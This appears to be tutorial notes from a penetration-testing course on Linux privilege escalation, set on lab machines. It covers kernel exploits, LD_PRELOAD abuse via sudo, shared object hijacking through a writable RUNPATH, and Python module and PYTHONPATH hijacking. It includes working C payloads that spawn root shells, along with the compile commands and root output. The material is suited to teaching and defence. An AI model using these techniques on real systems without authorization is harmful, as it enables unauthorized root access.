## 1- Kernel Exploits
Kernel exploits target Linux kernel flaws (e.g., Dirty COW) to gain root access. Many systems remain vulnerable due to unpatched or legacy kernels. Privilege escalation can be as simple as compiling and running an exploit, often found by checking the kernel version with `uname -a`. **Warning:** these exploits may destabilize production systems.
#### Kernel Exploit Example
Let's start by checking the Kernel level and Linux OS version.
```bash
uname -a 
  # Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
cat /etc/lsb-release 
  # DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"  
```
We can see that we are on **Linux Kernel 4.4.0-11**6 on an **Ubuntu 16.04.4 LTS** box.
. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC
```bash
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```
Next, we run the exploit and hopefully get dropped into a root shell.
```bash
./kernel_exploit 
  # spawning root shell
whoami # root  
```


---
## 2-Shared Libraries
Linux programs often use shared libraries to avoid rewriting code.  
There are two types: **static libraries (.a)**, which are built into the program and cannot be changed, and **dynamic libraries (.so)**, which are loaded at runtime and can be modified to affect how the program executes.
Dynamic library paths can be set in several ways: using **-rpath/-rpath-link** at compile time, environment variables like **LD_LIBRARY_PATH** or **LD_RUN_PATH**, placing libraries in **/lib** or **/usr/lib**, or defining paths in **/etc/ld.so.conf**.
**LD_PRELOAD** allows loading a library before running a binary, causing its functions to override the default ones. Required shared libraries for a binary can be viewed using **ldd**.
```bash
ldd /bin/ls 
  # linux-vdso.so.1 =>  (0x00007fff03bc7000)
```
The image above lists all the libraries required by `/bin/ls`, along with their absolute paths.

#### LD_PRELOAD Privilege Escalation
Let's see an example of how we can utilize the [LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.
```bash
sudo -l
  #Matching Defaults entries for daniel.carter on NIX02:
    # env_reset, mail_badpass, secure_path=/usr/local/sbin\:..., env_keep+=LD_PRELOAD
  #User daniel.carter may run the following commands on NIX02:
    # (root) NOPASSWD: /usr/sbin/apache2 restart
```
This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However,
we can exploit the `LD_PRELOAD` issue to run a custom shared library file. 
With `env_keep+=LD_PRELOAD`, `LD_PRELOAD` is kept and passed to the command run with sudo, which can allow **library injection** and potentially **privilege escalation** if misconfigured.

Let's compile the following library:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
We can compile this as follows:
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```


---
## 3- Shared Object Hijacking
Programs and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.
```bash
ls -la payroll # -rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```
We can use [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) to print the shared object required by a binary or shared object
```bash
ldd payroll
 # linux-vdso.so.1 =>  (0x00007ffcb3133000)
 # libshared.so => /development/libshared.so (0x00007f0c13112000)
 # libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
 # /lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
The binary depends on a non-standard library **libshared.so**.  Shared libraries can be loaded from custom paths, and **RUNPATH** has priority over default locations.  
You can check this using **readelf**.
```bash
readelf -d payroll  | grep PATH
  # 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).
```bash
ls -la /development/ # drwxrwxrwx root root  ./
```
Before compiling a library, we need to find the function name called by the binary.
```bash
ldd payroll
  # linux-vdso.so.1 (0x00007ffd22bbc000)
  # libshared.so => /development/libshared.so (0x00007f0c13112000)
  # /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```
```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll 
 # ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```
We can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.so`, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```
The `dbquery` function sets our user id to 0 (root) and executing `/bin/sh` when called. Compile it using [GCC](https://linux.die.net/man/1/gcc).
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```
Executing the binary again should display the banner and pops a root shell.
```bash
./payroll 
 # id : uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```


---
## 4-Python Library Hijacking
Python is a widely used language due to its simplicity and rich library ecosystem.  
Popular libraries include **NumPy** for numerical computing and **Pandas** for data analysis, especially time series.  
Python’s standard library provides many built-in modules, saving time while keeping performance efficient through modular imports.
In Python, we can import modules quite easily:
**Importing Modules:**
```python
#!/usr/bin/env python3
# Method 1
import pandas
```
There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable
#### Wrong Write Permissions
If a Python module is writable, it can be modified.  
and If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module , the malicious code runs automatically, our code will automatically be included.

**Python Script:** If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.
```bash
ls -l mem_status.py # -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```
By analyzing the permissions over the `mem_status.py` Python file, we understand that we can execute this script and we also have permission to view the script, and read its contents.
**Python Script - Contents:**
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```
So this script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that this script imports the module `psutil` and uses the function `virtual_memory()`.

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.
**Module Permissions:**
```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
 # /usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
 # /usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
 # /usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
 # /usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
 # /usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
 # /usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
 # /usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
 
# or  
pip3 show psutil #=> Location: /usr/local/lib/python3.8/dist-packages
 
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
  # -rw-r--rw- root staff /usr/local/lib/python3.8/dist-packages/psutil/__init__.py 
```
Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.
**Module Contents:**
```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```
Insert your code at the start of the function.  
Import `os` and run a command like `id` to verify the code executes.
**Module Contents - Hijacking:**
```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```
Now we can run the script with `sudo` and check if we get the desired result.
**Privilege Escalation:**
```bash
sudo /usr/bin/python3 ./mem_status.py
 # uid=0(root) gid=0(root) groups=0(root)
 # Available memory: 79.22%
```
Success. As we can see from the result above, we were successfully able to hijack the library and have our code inside of the `virtual_memory()` function run as `root`. Now that we have the desired result, we can edit the library again, but this time, insert a reverse shell that connects to our host as `root`.
#### Library Path
In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:
**PYTHONPATH Listing:**
```bash
python3 -c 'import sys; print("\n".join(sys.path))'
  # /usr/lib/python38.zip
  # /usr/lib/python3.8
  # /usr/lib/python3.8/lib-dynload
  # /usr/local/lib/python3.8/dist-packages
  # /usr/lib/python3/dist-packages
```
To be able to use this variant, two prerequisites are necessary.
1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

If a higher‑priority Python path is writable, you can create a fake module with the same name.  
Python loads it first, overriding the original module.

**example** : Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:
**Psutil Default Installation Location:**
```bash
pip3 show psutil
  # ...SNIP...
  # Location: /usr/local/lib/python3.8/dist-packages
  # ...SNIP...
```
From this example, we can see that `psutil` is installed in the following path: `/usr/local/lib/python3.8/dist-packages`. From our previous listing of the `PYTHONPATH` variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them. Let us check.
**Misconfigured Directory Permissions:**
```bash
ls -la /usr/lib/python3.8 # drwxr-xrwx root root   .
```
After checking all of the directories listed, it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.
**Hijacked Module Contents - psutil.py:**
```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```
In order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. This is critical as without either of these conditions being `true`, we will not be able perform this attack. After creating this file containing the example of our previous hijacking script, we have successfully prepped the system for exploitation.

Let us once again run the `mem_status.py` script using `sudo` like in the previous example.
**Privilege Escalation via Hijacking Python Library Path:**
```bash
sudo /usr/bin/python3 mem_status.py
 # uid=0(root) gid=0(root) groups=0(root)
 # Traceback (most recent call last):
 #   File "mem_status.py", line 4, in <module>
 #     available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
 #  AttributeError: 'NoneType' object has no attribute 'available'
```
As we can see from the output, we have successfully gained execution as `root` through hijacking the module's path via a misconfiguration in the permissions of the `/usr/lib/python3.8` directory.
#### PYTHONPATH Environment Variable
In the previous section, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:
**Checking sudo permissions:**
```bash
 sudo -l 
  # Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    # env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

 # User htb-student may run the following commands on ACADEMY-LPENIX:
     #(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```
As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.
**Privilege Escalation using PYTHONPATH Environment Variable:**
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
  # uid=0(root) gid=0(root) groups=0(root)
```
In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.

